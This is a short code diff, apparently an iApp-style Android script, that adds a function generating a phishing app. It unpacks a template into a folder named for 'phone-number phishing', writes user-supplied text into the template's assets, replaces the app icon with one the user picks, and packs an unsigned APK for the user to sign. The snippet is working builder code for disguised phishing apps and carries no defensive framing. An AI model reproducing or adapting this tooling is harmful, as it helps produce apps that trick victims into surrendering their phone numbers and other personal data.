@@ -1,0 +1,27 @@
+fn l()
+ug(86,"text",tp)
+ug(85,"text",a)
+f(tp=="选择软件图标"||a=="")
+{
+tw("请填写完整")
+}
+else
+{
+t()
+{
+ufnsui()
+{
+tw("生成中...")
+}
+fuzs("@yxdy","$幻隐网络/.手机号钓鱼",b)
+fw("$幻隐网络/.手机号钓鱼/assets/mm.txt",a)
+fc(tp,"$幻隐网络/.手机号钓鱼/res/drawable-hdpi/icon.png",m)
+fj("$幻隐网络/.手机号钓鱼","%未签名.apk",k)
+ufnsui()
+{
+tw("生成成功，请去手动签名...")
+}
+}
+}
+}
+end fn
